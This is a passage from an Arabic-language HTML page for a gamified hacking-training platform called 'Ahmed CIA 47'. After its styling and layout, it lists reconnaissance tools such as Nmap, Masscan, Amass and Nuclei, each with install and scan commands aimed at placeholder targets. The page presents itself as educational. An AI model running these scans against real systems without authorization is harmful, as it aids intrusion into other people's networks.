@@ -1,0 +1,1596 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Ahmed CIA 47 | منصة الهاكر المحترف</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap');
+:root{--bg:#050509;--panel:#0d0d15;--panel-2:#12121c;--panel-3:#181824;--line:#1a1a28;--line-hi:#262638;--fg:#eaeaf2;--dim:#7a7a92;--muted:#4a4a5e;--emerald:#10b981;--emerald-2:#059669;--cyan:#22b8d9;--amber:#e8b931;--red:#e34a4a;--purple:#8b5cf6}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{font-family:'Tajawal',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse 800px 400px at 20% -10%,rgba(16,185,129,.08),transparent 60%),radial-gradient(ellipse 600px 400px at 80% 110%,rgba(34,184,217,.05),transparent 60%)}
+.container{max-width:1400px;margin:0 auto;padding:0 16px;position:relative;z-index:1}
+.top-bar{position:sticky;top:0;z-index:100;background:rgba(5,5,9,.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid var(--line);padding:12px 0}
+.top-bar .container{display:flex;align-items:center;gap:20px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px;flex:1;min-width:220px}
+.logo-ring{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--panel-2),var(--bg));border:2px solid var(--emerald);display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow:0 0 20px rgba(16,185,129,.35);animation:pulseGlow 3s infinite}
+@keyframes pulseGlow{0%,100%{box-shadow:0 0 20px rgba(16,185,129,.35)}50%{box-shadow:0 0 30px rgba(16,185,129,.6)}}
+.brand h1{font-size:18px;font-weight:900;color:var(--emerald)}
+.brand h1 .badge{background:var(--emerald);color:#000;padding:2px 8px;border-radius:100px;font-size:10px;margin-right:6px;font-weight:900;letter-spacing:1px}
+.brand .subtitle{font-size:11px;color:var(--dim);margin-top:2px}
+.search-box{position:relative;flex:1;max-width:420px;min-width:200px}
+.search-box i{position:absolute;right:14px;top:50%;transform:translateY(-50%);color:var(--muted)}
+.search-box input{width:100%;padding:11px 42px 11px 16px;background:var(--panel);border:1px solid var(--line);border-radius:12px;color:var(--fg);font-family:inherit;font-size:14px;transition:.2s}
+.search-box input:focus{outline:none;border-color:var(--emerald);box-shadow:0 0 0 3px rgba(16,185,129,.2)}
+.progress-section{background:linear-gradient(180deg,var(--panel),transparent);border-bottom:1px solid var(--line);padding:20px 0}
+.level-display{display:flex;align-items:center;gap:16px;margin-bottom:14px}
+.level-icon{width:60px;height:60px;border-radius:16px;background:linear-gradient(135deg,var(--panel-2),var(--bg));border:2px solid var(--emerald);display:flex;align-items:center;justify-content:center;font-size:30px;transition:.3s}
+.level-info{flex:1}
+.level-name{font-size:22px;font-weight:900;color:var(--emerald);margin-bottom:2px}
+.level-num{font-size:12px;color:var(--dim)}
+.level-xp{text-align:left}
+.xp-value{font-size:20px;font-weight:900;color:var(--amber);font-family:'Courier New',monospace}
+.xp-target{font-size:11px;color:var(--dim)}
+.progress-bar{height:8px;background:var(--panel-2);border-radius:100px;overflow:hidden;margin-bottom:16px}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--emerald),var(--cyan));border-radius:100px;width:0%;transition:width .5s ease;box-shadow:0 0 12px var(--emerald)}
+.stats-row{display:flex;gap:20px;flex-wrap:wrap}
+.stat{display:flex;align-items:center;gap:6px;font-size:13px;color:var(--dim)}
+.stat i{color:var(--emerald)}
+.stat span{color:var(--fg);font-weight:700;font-family:'Courier New',monospace}
+.tabs{background:var(--panel);border-bottom:1px solid var(--line);padding:10px 0;position:sticky;top:73px;z-index:99}
+.tabs .container{display:flex;gap:6px;overflow-x:auto;scrollbar-width:none}
+.tabs .container::-webkit-scrollbar{display:none}
+.tab{padding:9px 18px;background:transparent;border:1px solid var(--line);color:var(--dim);border-radius:10px;cursor:pointer;white-space:nowrap;font-family:inherit;font-size:13px;font-weight:700;transition:.15s}
+.tab:hover{color:var(--fg);border-color:var(--muted)}
+.tab.active{background:rgba(16,185,129,.12);border-color:var(--emerald);color:var(--emerald);box-shadow:0 0 14px rgba(16,185,129,.2)}
+main{padding:24px 0 60px}
+.tab-content{display:none;animation:fadeIn .3s}
+.tab-content.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.section-title{font-size:20px;font-weight:900;margin-bottom:20px;color:var(--emerald);border-right:3px solid var(--emerald);padding-right:12px}
+.filters{display:flex;flex-direction:column;gap:12px;margin-bottom:20px}
+.filter-group{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.filter-label{font-size:12px;color:var(--muted);font-weight:700}
+.filter-btn{padding:6px 14px;background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:8px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:700;transition:.15s}
+.filter-btn:hover{color:var(--fg)}
+.filter-btn.active{background:rgba(16,185,129,.12);border-color:var(--emerald);color:var(--emerald)}
+.categories{display:flex;gap:6px;overflow-x:auto;margin-bottom:20px;padding-bottom:4px;scrollbar-width:none}
+.categories::-webkit-scrollbar{display:none}
+.cat-btn{padding:8px 16px;background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:100px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:700;white-space:nowrap;transition:.15s}
+.cat-btn:hover{color:var(--fg);border-color:var(--muted)}
+.cat-btn.active{background:rgba(16,185,129,.15);border-color:var(--emerald);color:var(--emerald)}
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:14px}
+.tool-card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;display:flex;flex-direction:column;gap:10px;transition:.2s;position:relative;overflow:hidden}
+.tool-card::before{content:'';position:absolute;top:0;bottom:0;right:0;width:3px;background:var(--muted);transition:.2s}
+.tool-card[data-diff="beginner"]::before{background:#6b7280}
+.tool-card[data-diff="intermediate"]::before{background:var(--cyan)}
+.tool-card[data-diff="advanced"]::before{background:var(--emerald)}
+.tool-card[data-diff="expert"]::before{background:var(--amber)}
+.tool-card[data-diff="legendary"]::before{background:var(--red)}
+.tool-card:hover{border-color:var(--muted);transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.tool-card.done{border-color:rgba(16,185,129,.4);background:linear-gradient(180deg,rgba(16,185,129,.05),var(--panel))}
+.tool-head{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
+.tool-name{font-size:15px;font-weight:800;color:var(--fg)}
+.tool-badges{display:flex;gap:6px;flex-wrap:wrap}
+.tool-badge{padding:2px 8px;border-radius:100px;font-size:9px;font-weight:800;letter-spacing:.5px;border:1px solid}
+.tool-badge.diff-beginner{color:#9ca3af;border-color:#4b5563;background:rgba(75,85,99,.15)}
+.tool-badge.diff-intermediate{color:var(--cyan);border-color:var(--cyan);background:rgba(34,184,217,.1)}
+.tool-badge.diff-advanced{color:var(--emerald);border-color:var(--emerald);background:rgba(16,185,129,.1)}
+.tool-badge.diff-expert{color:var(--amber);border-color:var(--amber);background:rgba(232,185,49,.1)}
+.tool-badge.diff-legendary{color:var(--red);border-color:var(--red);background:rgba(227,74,74,.1)}
+.tool-xp{padding:2px 8px;border-radius:100px;background:rgba(232,185,49,.15);color:var(--amber);border:1px solid rgba(232,185,49,.4);font-size:10px;font-weight:900}
+.tool-desc{font-size:12px;color:var(--dim);line-height:1.6}
+.code-box{background:#04040a;padding:10px 12px;border-radius:8px;border:1px solid var(--line);font-family:'Courier New',monospace;font-size:11.5px;direction:ltr;text-align:left;display:flex;justify-content:space-between;align-items:center;gap:8px;overflow:hidden}
+.code-box code{color:#a8e8b8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1}
+.copy-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-size:14px;padding:4px;transition:.15s;flex-shrink:0}
+.copy-btn:hover{color:var(--emerald)}
+.tool-actions{display:flex;gap:8px;margin-top:auto}
+.master-btn{flex:1;padding:9px 12px;border:1px solid var(--emerald);background:rgba(16,185,129,.1);color:var(--emerald);border-radius:8px;cursor:pointer;font-family:inherit;font-size:12px;font-weight:800;transition:.15s;display:flex;align-items:center;justify-content:center;gap:6px}
+.master-btn:hover{background:rgba(16,185,129,.2)}
+.tool-card.done .master-btn{background:var(--emerald);color:#000}
+.arsenal-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:16px}
+.arsenal-card{background:linear-gradient(135deg,var(--panel),var(--panel-2));border:1px solid var(--line);border-radius:16px;padding:18px;cursor:pointer;transition:.25s;display:flex;gap:14px;position:relative;overflow:hidden}
+.arsenal-card::before{content:'';position:absolute;top:0;right:0;bottom:0;width:4px;background:var(--muted);transition:.2s}
+.arsenal-card[data-diff="beginner"]::before{background:#6b7280}
+.arsenal-card[data-diff="intermediate"]::before{background:var(--cyan)}
+.arsenal-card[data-diff="advanced"]::before{background:var(--emerald)}
+.arsenal-card[data-diff="expert"]::before{background:var(--amber)}
+.arsenal-card[data-diff="legendary"]::before{background:var(--red)}
+.arsenal-card:hover{border-color:var(--emerald);transform:translateY(-3px);box-shadow:0 12px 40px rgba(16,185,129,.15)}
+.arsenal-card:hover .arsenal-icon{transform:scale(1.1) rotate(-5deg)}
+.arsenal-icon{width:60px;height:60px;flex-shrink:0;border-radius:14px;background:linear-gradient(135deg,var(--panel-2),var(--bg));border:1px solid var(--line);display:flex;align-items:center;justify-content:center;font-size:32px;transition:.3s;box-shadow:inset 0 0 20px rgba(16,185,129,.08)}
+.arsenal-body{flex:1;min-width:0}
+.arsenal-head{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-bottom:6px}
+.arsenal-head h3{font-size:16px;font-weight:900;color:var(--fg);margin:0;line-height:1.3}
+.status-badge{padding:3px 10px;border-radius:100px;font-size:9px;font-weight:900;letter-spacing:1px;flex-shrink:0}
+.status-badge.working{background:rgba(16,185,129,.15);color:var(--emerald);border:1px solid var(--emerald)}
+.arsenal-tag{color:var(--cyan);font-size:12px;font-weight:700;margin-bottom:8px}
+.arsenal-sum{color:var(--dim);font-size:12px;line-height:1.7;margin-bottom:12px}
+.arsenal-meta{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
+.arsenal-count{padding:2px 8px;border-radius:100px;background:var(--panel);border:1px solid var(--line);color:var(--dim);font-size:10px;font-weight:700}
+.project-detail{animation:fadeIn .3s;max-width:1000px;margin:0 auto}
+.back-btn{padding:10px 18px;background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:10px;cursor:pointer;font-family:inherit;font-size:13px;font-weight:700;display:inline-flex;align-items:center;gap:8px;margin-bottom:24px;transition:.15s}
+.back-btn:hover{color:var(--fg);border-color:var(--emerald);background:var(--panel-2)}
+.back-btn.large{padding:14px 28px;font-size:14px}
+.project-header{display:flex;gap:20px;align-items:center;padding:24px;background:linear-gradient(135deg,var(--panel),var(--panel-2));border:1px solid var(--line);border-radius:18px;margin-bottom:20px;position:relative;overflow:hidden}
+.project-header::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--emerald),var(--cyan),var(--emerald))}
+.ph-icon{width:80px;height:80px;border-radius:18px;background:linear-gradient(135deg,var(--panel-2),var(--bg));border:2px solid var(--emerald);display:flex;align-items:center;justify-content:center;font-size:44px;flex-shrink:0;box-shadow:0 0 30px rgba(16,185,129,.3)}
+.project-header h2{font-size:22px;font-weight:900;color:var(--emerald);margin:0 0 6px}
+.ph-tag{color:var(--cyan);font-size:13px;font-weight:700;margin-bottom:10px}
+.ph-meta{display:flex;gap:10px;align-items:center;font-size:12px;color:var(--dim)}
+.proj-summary{background:var(--panel);border:1px solid var(--line);border-right:4px solid var(--emerald);border-radius:12px;padding:16px 20px;margin-bottom:20px;color:var(--fg);font-size:14px;line-height:1.8}
+.proj-section{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px;margin-bottom:16px}
+.proj-section h4{color:var(--emerald);font-size:15px;font-weight:900;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.feat-list,.req-list{list-style:none;padding:0;margin:0}
+.feat-list li,.req-list li{padding:8px 0 8px 26px;color:var(--dim);font-size:13px;line-height:1.6;position:relative;border-bottom:1px solid var(--line)}
+.feat-list li:last-child,.req-list li:last-child{border-bottom:none}
+.feat-list li::before{content:'✓';position:absolute;right:0;color:var(--emerald);font-weight:900}
+.req-list li::before{content:'▸';position:absolute;right:4px;color:var(--cyan);font-weight:900}
+.structure-pre{background:#04040a;border:1px solid var(--line);border-radius:10px;padding:16px;font-family:'Courier New',monospace;font-size:12px;color:#a8e8b8;overflow-x:auto;direction:ltr;text-align:left;line-height:1.7;white-space:pre}
+.proj-step{background:var(--panel-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin-bottom:12px;position:relative}
+.proj-step::before{content:'';position:absolute;top:0;bottom:0;right:0;width:3px;background:linear-gradient(180deg,var(--emerald),var(--cyan));border-radius:3px}
+.step-head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.step-num{width:32px;height:32px;border-radius:50%;background:var(--emerald);color:#000;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:14px;flex-shrink:0}
+.step-title{font-size:14px;font-weight:800;color:var(--fg)}
+.step-cmds{display:flex;flex-direction:column;gap:6px}
+.code-line{background:#04040a;border:1px solid var(--line);border-radius:8px;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;gap:10px;transition:.15s}
+.code-line:hover{border-color:var(--emerald);background:#080812}
+.code-line code{font-family:'Courier New',monospace;font-size:12px;color:#a8e8b8;direction:ltr;text-align:left;word-break:break-all;flex:1}
+.copy-line{background:transparent;border:none;color:var(--muted);cursor:pointer;padding:4px 8px;font-size:14px;transition:.15s;flex-shrink:0}
+.copy-line:hover{color:var(--emerald)}
+.step-note{margin-top:10px;padding:10px 14px;background:rgba(232,185,49,.08);border:1px solid rgba(232,185,49,.3);border-radius:8px;font-size:12px;color:var(--amber);line-height:1.6}
+.usage-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
+.usage-item{background:var(--panel-2);border:1px solid var(--line);border-radius:10px;padding:12px}
+.usage-cmd{background:#04040a;border-radius:6px;padding:6px 10px;margin-bottom:8px}
+.usage-cmd code{font-family:'Courier New',monospace;font-size:12px;color:#a8e8b8;direction:ltr;display:block;text-align:left}
+.usage-desc{font-size:12px;color:var(--dim);line-height:1.6}
+.proj-footer{text-align:center;padding:24px 0}
+.paths-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
+.path-card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px;position:relative;overflow:hidden}
+.path-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--emerald),var(--cyan))}
+.path-card h3{font-size:16px;margin-bottom:8px;color:var(--emerald)}
+.path-card p{font-size:12px;color:var(--dim);margin-bottom:12px;line-height:1.7}
+.path-progress{height:6px;background:var(--panel-2);border-radius:100px;overflow:hidden;margin-bottom:8px}
+.path-progress div{height:100%;background:linear-gradient(90deg,var(--emerald),var(--cyan));transition:width .5s}
+.path-meta{display:flex;justify-content:space-between;font-size:11px;color:var(--muted)}
+.achievements-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
+.ach-card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;text-align:center;transition:.2s}
+.ach-card.locked{opacity:.4}
+.ach-card.unlocked{border-color:var(--emerald);background:linear-gradient(180deg,rgba(16,185,129,.08),var(--panel));box-shadow:0 0 20px rgba(16,185,129,.15)}
+.ach-icon{font-size:40px;margin-bottom:10px}
+.ach-name{font-size:14px;font-weight:800;margin-bottom:4px}
+.ach-desc{font-size:11px;color:var(--dim)}
+.stats-panel{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px}
+.stat-box{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px;text-align:center}
+.stat-box .value{font-size:32px;font-weight:900;color:var(--emerald);font-family:'Courier New',monospace}
+.stat-box .label{font-size:12px;color:var(--dim);margin-top:4px}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:var(--panel-2);border:1px solid var(--emerald);padding:14px 22px;border-radius:12px;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:700;box-shadow:0 8px 32px rgba(16,185,129,.3);opacity:0;transition:.4s;z-index:1000;pointer-events:none}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast .ico{font-size:24px}
+.empty-state{text-align:center;padding:60px 20px;color:var(--muted)}
+.empty-state i{font-size:50px;margin-bottom:12px;opacity:.4}
+.footer{border-top:1px solid var(--line);padding:20px;text-align:center;font-size:11px;color:var(--muted)}
+@media(max-width:768px){.top-bar .container{flex-direction:column;align-items:stretch}.level-display{flex-wrap:wrap}.level-xp{text-align:right;width:100%}.tools-grid,.arsenal-grid{grid-template-columns:1fr}.project-header{flex-direction:column;text-align:center}.usage-grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<header class="top-bar">
+<div class="container">
+<div class="brand">
+<div class="logo-ring">👽</div>
+<div>
+<h1>Ahmed CIA 47 <span class="badge">PRO</span></h1>
+<p class="subtitle">منصة تعليم الهاكرز • 1050 أداة • 10 مستويات</p>
+</div>
+</div>
+<div class="search-box">
+<i class="fa-solid fa-magnifying-glass"></i>
+<input type="text" id="searchInput" placeholder="ابحث عن أداة أو أمر أو ثغرة...">
+</div>
+</div>
+</header>
+
+<section class="progress-section">
+<div class="container">
+<div class="level-display">
+<div class="level-icon" id="levelIcon">🥚</div>
+<div class="level-info">
+<div class="level-name" id="levelName">مبتدئ</div>
+<div class="level-num">المستوى <span id="levelNum">1</span> / 10</div>
+</div>
+<div class="level-xp">
+<div class="xp-value" id="xpValue">0 XP</div>
+<div class="xp-target" id="xpTarget">التالي: 200 XP</div>
+</div>
+</div>
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<div class="stats-row">
+<div class="stat"><i class="fa-solid fa-check"></i><span id="mastered">0</span> أداة متقنة</div>
+<div class="stat"><i class="fa-solid fa-database"></i><span id="totalTools">0</span> إجمالي</div>
+<div class="stat"><i class="fa-solid fa-fire"></i><span id="percent">0%</span> إنجاز</div>
+<div class="stat"><i class="fa-solid fa-trophy"></i><span id="achieveCount">0</span> إنجاز</div>
+</div>
+</div>
+</section>
+
+<nav class="tabs">
+<div class="container">
+<button class="tab active" data-tab="tools">📚 الأدوات</button>
+<button class="tab" data-tab="arsenal">🛠️ ترسانتنا</button>
+<button class="tab" data-tab="paths">🛣️ مسارات التعلم</button>
+<button class="tab" data-tab="achievements">🏆 الإنجازات</button>
+<button class="tab" data-tab="stats">📊 الإحصائيات</button>
+</div>
+</nav>
+
+<main class="container">
+<section id="tab-tools" class="tab-content active">
+<div class="filters">
+<div class="filter-group">
+<span class="filter-label">النظام:</span>
+<button class="filter-btn active" data-platform="all">الكل</button>
+<button class="filter-btn" data-platform="kali">Kali</button>
+<button class="filter-btn" data-platform="termux">Termux</button>
+</div>
+<div class="filter-group">
+<span class="filter-label">الصعوبة:</span>
+<button class="filter-btn active" data-diff="all">الكل</button>
+<button class="filter-btn" data-diff="beginner">🥚 مبتدئ</button>
+<button class="filter-btn" data-diff="intermediate">📚 متوسط</button>
+<button class="filter-btn" data-diff="advanced">⚔️ متقدم</button>
+<button class="filter-btn" data-diff="expert">👑 خبير</button>
+<button class="filter-btn" data-diff="legendary">👽 أسطوري</button>
+</div>
+<div class="filter-group">
+<span class="filter-label">الحالة:</span>
+<button class="filter-btn active" data-status="all">الكل</button>
+<button class="filter-btn" data-status="locked">🔒 متبقية</button>
+<button class="filter-btn" data-status="done">✅ متقنة</button>
+</div>
+</div>
+<div class="categories" id="categoryFilters"></div>
+<div class="tools-grid" id="toolsGrid"></div>
+<div class="empty-state" id="emptyState" style="display:none">
+<i class="fa-solid fa-bug"></i><p>لا توجد نتائج مطابقة</p>
+</div>
+</section>
+
+<section id="tab-arsenal" class="tab-content">
+<h2 class="section-title">ترسانة Ahmed CIA 47</h2>
+<p style="color:#7a7a92;margin-bottom:24px;font-size:13px">كل المشاريع اللي بنيناها — بأوامر تشغيل كاملة خطوة بخطوة.</p>
+<div id="arsenalGrid" class="arsenal-grid"></div>
+<div id="projectDetail" class="project-detail" style="display:none"></div>
+</section>
+
+<section id="tab-paths" class="tab-content">
+<h2 class="section-title">مسارات التعلم المُعدّة</h2>
+<div class="paths-grid" id="pathsGrid"></div>
+</section>
+
+<section id="tab-achievements" class="tab-content">
+<h2 class="section-title">الإنجازات</h2>
+<div class="achievements-grid" id="achievementsGrid"></div>
+</section>
+
+<section id="tab-stats" class="tab-content">
+<h2 class="section-title">إحصائياتك</h2>
+<div class="stats-panel" id="statsPanel"></div>
+</section>
+</main>
+
+<div id="toast" class="toast"></div>
+
+<footer class="footer">
+<p>Ahmed CIA 47 © 2026 — للأغراض التعليمية والاختبار المصرح به فقط</p>
+</footer>
+
+<script>
+const TOOLS = [
+// ═══════════════════════════════════════════════════════
+// TOOLS — Recon (60 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Nmap",category:"recon",platform:"both",difficulty:"beginner",desc:"ماسح المنافذ والخدمات الأشهر — أساس كل عملية اختبار",install:"pkg install nmap",command:"nmap -A -T4 -sV -sC <target>"},
+{tool:"Masscan",category:"recon",platform:"kali",difficulty:"intermediate",desc:"أسرع ماسح منافذ للشبكات الضخمة (10M pps)",install:"apt install masscan",command:"masscan -p1-65535 10.0.0.0/24 --rate=10000"},
+{tool:"RustScan",category:"recon",platform:"kali",difficulty:"intermediate",desc:"ماسح حديث بلغة Rust — 65K port في ثواني",install:"docker run -it rustscan/rustscan",command:"rustscan -a <IP> -- -sV -sC"},
+{tool:"Amass",category:"recon",platform:"both",difficulty:"advanced",desc:"أداة OWASP لاكتشاف subdomains بعمق",install:"pkg install amass",command:"amass enum -d target.com -o subs.txt"},
+{tool:"Subfinder",category:"recon",platform:"both",difficulty:"intermediate",desc:"اكتشاف Subdomains passive من 30+ مصدر",install:"pkg install subfinder",command:"subfinder -d target.com -silent -o subs.txt"},
+{tool:"httpx",category:"recon",platform:"both",difficulty:"intermediate",desc:"فحص HTTP سريع + التقنيات",install:"pkg install httpx",command:"httpx -l urls.txt -title -tech-detect -status-code"},
+{tool:"Katana",category:"recon",platform:"both",difficulty:"advanced",desc:"زاحف ويب يدعم JavaScript",install:"pkg install katana",command:"katana -u https://t.com -d 3 -jc -o crawl.txt"},
+{tool:"gau",category:"recon",platform:"both",difficulty:"beginner",desc:"جلب URLs من AlienVault + Wayback",install:"go install github.com/lc/gau/v2/cmd/gau@latest",command:"gau target.com > urls.txt"},
+{tool:"waybackurls",category:"recon",platform:"both",difficulty:"beginner",desc:"استخراج URLs من Wayback Machine",install:"go install github.com/tomnomnom/waybackurls@latest",command:"echo target.com | waybackurls"},
+{tool:"dnsx",category:"recon",platform:"both",difficulty:"intermediate",desc:"أداة DNS سريعة للتحقق",install:"pkg install dnsx",command:"dnsx -l subs.txt -a -resp"},
+{tool:"Naabu",category:"recon",platform:"both",difficulty:"intermediate",desc:"ماسح منافذ سريع من PD",install:"pkg install naabu",command:"naabu -host target.com -top-ports 1000"},
+{tool:"DNSRecon",category:"recon",platform:"both",difficulty:"intermediate",desc:"استطلاع DNS متقدم",install:"pkg install dnsrecon",command:"dnsrecon -d target.com -t std,brt,axfr"},
+{tool:"dnsenum",category:"recon",platform:"both",difficulty:"beginner",desc:"سكربت Perl لتعداد DNS",install:"pkg install dnsenum",command:"dnsenum target.com"},
+{tool:"WhatWeb",category:"recon",platform:"both",difficulty:"beginner",desc:"تحديد التقنيات المستخدمة",install:"pkg install whatweb",command:"whatweb -a 3 https://target.com"},
+{tool:"Wafw00f",category:"recon",platform:"both",difficulty:"beginner",desc:"كشف نوع WAF",install:"pkg install wafw00f",command:"wafw00f https://target.com"},
+{tool:"theHarvester",category:"recon",platform:"both",difficulty:"intermediate",desc:"جمع إيميلات ونطاقات",install:"pkg install theharvester",command:"theHarvester -d target.com -b all"},
+{tool:"Recon-ng",category:"recon",platform:"both",difficulty:"advanced",desc:"إطار استطلاع modular",install:"pkg install recon-ng",command:"recon-ng -w project1"},
+{tool:"Shodan CLI",category:"recon",platform:"both",difficulty:"advanced",desc:"البحث في أجهزة IoT المكشوفة",install:"pip install shodan",command:"shodan search 'apache country:EG'"},
+{tool:"Netdiscover",category:"recon",platform:"both",difficulty:"beginner",desc:"اكتشاف أجهزة LAN",install:"pkg install netdiscover",command:"netdiscover -r 192.168.1.0/24"},
+{tool:"arp-scan",category:"recon",platform:"both",difficulty:"beginner",desc:"مسح ARP سريع",install:"pkg install arp-scan",command:"arp-scan -l --interface=wlan0"},
+{tool:"hping3",category:"recon",platform:"both",difficulty:"advanced",desc:"إرسال حزم TCP/UDP/ICMP مخصصة",install:"pkg install hping3",command:"hping3 -S -p 80 -c 5 target.com"},
+{tool:"mtr",category:"recon",platform:"both",difficulty:"beginner",desc:"تتبع مسار الشبكة",install:"pkg install mtr",command:"mtr -rwzbc 50 8.8.8.8"},
+{tool:"Fierce",category:"recon",platform:"kali",difficulty:"intermediate",desc:"اكتشاف نطاقات فرعية",install:"apt install fierce",command:"fierce --domain target.com"},
+{tool:"Assetfinder",category:"recon",platform:"both",difficulty:"beginner",desc:"اكتشاف أصول ونطاقات فرعية",install:"go install github.com/tomnomnom/assetfinder@latest",command:"assetfinder --subs-only target.com"},
+{tool:"Findomain",category:"recon",platform:"both",difficulty:"intermediate",desc:"أسرع أداة subdomains بـ Rust",install:"# من GitHub releases",command:"findomain -t target.com"},
+{tool:"Sublist3r",category:"recon",platform:"both",difficulty:"beginner",desc:"أداة Python لـ subdomains",install:"pip install sublist3r",command:"sublist3r -d target.com -o subs.txt"},
+{tool:"Aquatone",category:"recon",platform:"kali",difficulty:"advanced",desc:"مسح بصري متعدد المواقع",install:"go install github.com/michenriksen/aquatone@latest",command:"cat hosts.txt | aquatone"},
+{tool:"EyeWitness",category:"recon",platform:"kali",difficulty:"intermediate",desc:"screenshots لمواقع متعددة",install:"apt install eyewitness",command:"eyewitness --web -f urls.txt"},
+{tool:"Nuclei",category:"recon",platform:"both",difficulty:"advanced",desc:"فحص ثغرات بـ 6000+ قالب YAML",install:"pkg install nuclei",command:"nuclei -u https://t.com -severity critical,high"},
+{tool:"Chaos",category:"recon",platform:"both",difficulty:"intermediate",desc:"Subdomains من ProjectDiscovery",install:"# من GitHub",command:"chaos -d target.com"},
+{tool:"Gospider",category:"recon",platform:"both",difficulty:"intermediate",desc:"زاحف سريع بلغة Go",install:"go install github.com/jaeles-project/gospider@latest",command:"gospider -s https://t.com -d 3"},
+{tool:"Meg",category:"recon",platform:"both",difficulty:"intermediate",desc:"طلب مسارات متوازي",install:"go install github.com/tomnomnom/meg@latest",command:"meg -d 1000 / < paths.txt"},
+{tool:"Hakrawler",category:"recon",platform:"both",difficulty:"beginner",desc:"زاحف سريع لاستخراج links",install:"go install github.com/hakluke/hakrawler@latest",command:"echo http://t.com | hakrawler -d 3"},
+{tool:"Gauplus",category:"recon",platform:"both",difficulty:"intermediate",desc:"نسخة محسّنة من gau",install:"go install github.com/bp0lr/gauplus@latest",command:"gauplus target.com"},
+{tool:"Gowitness",category:"recon",platform:"both",difficulty:"intermediate",desc:"screenshots عبر Chrome headless",install:"go install github.com/sensepost/gowitness@latest",command:"gowitness file -f urls.txt"},
+{tool:"Httprobe",category:"recon",platform:"both",difficulty:"beginner",desc:"فحص المواقع الحية",install:"go install github.com/tomnomnom/httprobe@latest",command:"cat subs.txt | httprobe"},
+{tool:"Gobuster-dns",category:"recon",platform:"both",difficulty:"beginner",desc:"تخمين DNS عبر Gobuster",install:"pkg install gobuster",command:"gobuster dns -d t.com -w wordlist.txt"},
+{tool:"Amass Intel",category:"recon",platform:"both",difficulty:"advanced",desc:"استطلاع منظم من Amass Intel",install:"pkg install amass",command:"amass intel -d target.com -whois"},
+{tool:"Tlsx",category:"recon",platform:"both",difficulty:"intermediate",desc:"تحليل شهادات TLS",install:"go install github.com/projectdiscovery/tlsx/cmd/tlsx@latest",command:"tlsx -l hosts.txt -san -cn"},
+{tool:"Cdncheck",category:"recon",platform:"both",difficulty:"intermediate",desc:"كشف CDN/WAF",install:"go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest",command:"cdncheck -i target.com"},
+{tool:"Asnmap",category:"recon",platform:"both",difficulty:"intermediate",desc:"خرائط ASN",install:"go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest",command:"asnmap -d target.com"},
+{tool:"Mapcidr",category:"recon",platform:"both",difficulty:"intermediate",desc:"تقسيم CIDR",install:"go install github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest",command:"mapcidr -cidr 192.168.1.0/24 -slice 24"},
+{tool:"Shuffledns",category:"recon",platform:"both",difficulty:"advanced",desc:"DNS bruteforce ضخم",install:"go install github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest",command:"shuffledns -d target.com -w words.txt -r resolvers.txt"},
